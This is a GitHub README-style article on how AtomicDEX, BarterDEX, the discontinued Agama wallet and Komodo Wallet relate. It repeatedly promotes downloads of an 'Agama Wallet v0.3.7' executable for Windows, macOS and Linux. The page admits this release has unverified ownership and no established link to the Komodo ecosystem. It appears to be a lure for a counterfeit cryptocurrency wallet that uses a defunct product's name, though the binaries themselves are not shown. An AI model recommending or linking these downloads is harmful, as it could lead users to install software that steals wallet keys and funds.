[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# AtomicDEX: What the Decentralised Exchange Was

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

AtomicDEX was the Komodo ecosystem's decentralised exchange, built on the BarterDEX protocol, and it replaced the original Agama wallet when Komodo discontinued it in June 2019. Understanding it explains where the swap engine in a desktop Komodo wallet came from. Agama Wallet, the current 0.3.7 release, is a separately distributed product and is not the same software as AtomicDEX.

## You'll see this if

You are following a link or a forum post that refers to "AtomicDEX" and a download page that offers something called Agama Wallet, and the two names appear in the same histories without ever being explained.

| Name you meet | What it refers to | Status |
|---|---|---|
| Agama (original) | Komodo's desktop wallet, to 2019 | Discontinued 2019-06-07 |
| BarterDEX | The peer-to-peer swap protocol the wallet used | Protocol layer, not an app |
| AtomicDEX | The exchange Komodo named as Agama's replacement | Successor product |
| Komodo Wallet / Gleec Exchange Wallet | The current wallet in that ecosystem | Current |
| Agama Wallet 0.3.7 | A release published on GitHub | Ownership unverified |

The columns matter because a search for "AtomicDEX" can land on a page about any of the five.

## Why it happens

The swap functionality and the wallet were always separate layers that shipped together. BarterDEX was the protocol: an order book and a peer-to-peer matching engine that settled trades through hash time-locked contracts. Agama was the interface and key store.

When Komodo discontinued the wallet in June 2019, it pointed users at AtomicDEX rather than at a newer build of Agama. Later, the ecosystem's wallet became Komodo Wallet, and Komodo is now part of the Gleec ecosystem with Gleec Exchange Wallet as the current wallet. That is three names across seven years for one lineage, plus a fourth product that shares the Agama name without sharing the lineage.

The swap engine's presence in a desktop wallet is why the wallet's own description mentions atomic swaps at all: the maker describes swaps as running through BarterDEX over hash time-locked contracts. [What an atomic swap is](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md) covers the mechanism, and [BarterDEX](https://github.com/agama-wallet/agama-wallet/blob/main/barterdex-protocol.md) covers the protocol itself.

## Fix

There is no defect to repair; the task is placing a name correctly before acting on it.

1. **Check the date of whatever you are reading.** Anything written before mid-2019 is about the original wallet, not about a current build.
2. **Check whether the source is the protocol or the app.** BarterDEX describes settlement; AtomicDEX describes a venue.
3. **Check which product a download page is offering.** A page offering the 0.3.7 release is not offering AtomicDEX.
4. **Do not treat the names as interchangeable when following instructions.** A step written for AtomicDEX does not necessarily apply to a desktop wallet build, and the reverse.
5. **Prefer the ecosystem's current documentation** when the question is about Komodo's present wallet rather than its history.

If the question is "which of these can import my old wallet", the answer belongs to the import path rather than to the branding: [moving KMD out of an old Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md) covers the export side.

## If that did not work

If a download claims to be "AtomicDEX" and also "Agama", that combination does not describe any product in the lineage, and the safe response is to stop rather than to install and see.

If an old tutorial's steps do not match the interface in front of you, the mismatch is usually the version gap rather than a mistake by the reader. A wallet discontinued in 2019 and a 2026 download will not share menus.

If a swap interface in a current build looks nothing like the AtomicDEX screenshots you found, that is expected: the interface is the product, the protocol is underneath, and the two changed on different schedules.

## Prevention

- **Date every claim about Komodo wallets.** The lineage is short but the names are reused.
- **Keep protocol and product separate in notes.** "BarterDEX" is not an app you install.
- **Do not cross-apply instructions between products.** Copying a step from one to the other is how funds get sent to the wrong place.
- **Treat a shared name as a warning, not a shortcut.** [Is Agama Wallet discontinued](https://github.com/agama-wallet/agama-wallet/blob/main/two-products-one-name.md) lays out the timeline in one table.
- **Ask which layer a recommendation refers to.** "Use AtomicDEX" once meant "use the successor exchange"; applied to a desktop wallet today it means nothing at all.

## FAQ

### Is AtomicDEX the same as Agama Wallet?

No. AtomicDEX was the exchange Komodo named as the replacement for the original Agama wallet in 2019. The Agama Wallet 0.3.7 release offered today is a different, separately distributed product with no established link to Komodo or Gleec.

### Did AtomicDEX use atomic swaps?

Yes. Its settlement relied on the BarterDEX protocol and hash time-locked contracts, which is why the swap mechanism and the exchange share a vocabulary.

### Is AtomicDEX still the current Komodo wallet?

No. The ecosystem's wallet moved on: Komodo Wallet came after AtomicDEX, and Komodo is now part of the Gleec ecosystem with Gleec Exchange Wallet as the current wallet. [Komodo Wallet and KMD](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md) covers what exists now.

### Is BarterDEX the same thing as AtomicDEX?

No. BarterDEX is the swap protocol: an order book and matching mechanism that settles trades through hash time-locked contracts. AtomicDEX was the exchange built on it. One is a way to settle a trade, the other is a place where trades were offered, which is why documentation uses the names for different things.

### Why do old forum posts recommend AtomicDEX for Agama users?

Because at the time it was the official successor. Recommendations written in 2019 are accurate for 2019 and stale for anything since.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [BarterDEX: The Exchange Agama Shipped With](https://github.com/agama-wallet/agama-wallet/blob/main/barterdex-protocol.md)
- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [Komodo Wallet: What It Is and How KMD Works](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md)
- [Is Agama Wallet Discontinued? Two Products, One Name](https://github.com/agama-wallet/agama-wallet/blob/main/two-products-one-name.md)
